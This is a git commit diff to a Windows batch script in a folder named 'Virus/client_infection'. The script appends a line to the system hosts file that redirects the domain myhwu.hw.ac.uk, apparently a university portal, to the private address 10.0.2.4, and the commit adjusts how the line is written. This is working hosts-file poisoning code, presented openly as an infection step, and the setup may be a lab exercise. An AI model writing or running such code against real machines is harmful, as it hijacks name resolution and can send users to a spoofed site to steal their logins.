d394f65b7ba4f9ba1c8874bd6daecdea23fe6605
RajJagasia <106627812+RajJagasia@users.noreply.github.com>
2024-03-19 01:55:41 +0400

    Update v.cmd

--- Virus/client_infection/v.cmd
+++ Virus/client_infection/v.cmd
@@ -4,6 +4,7 @@ setlocal enabledelayedexpansion
 set "hosts_path=C:\Windows\System32\drivers\etc\hosts"
 set "new_entry=10.0.2.4  myhwu.hw.ac.uk"
 
-echo \n %new_entry%>>"%hosts_path%"
+echo. >> "%hosts_path%"
+echo %new_entry%>>"%hosts_path%"
 
 exit /b
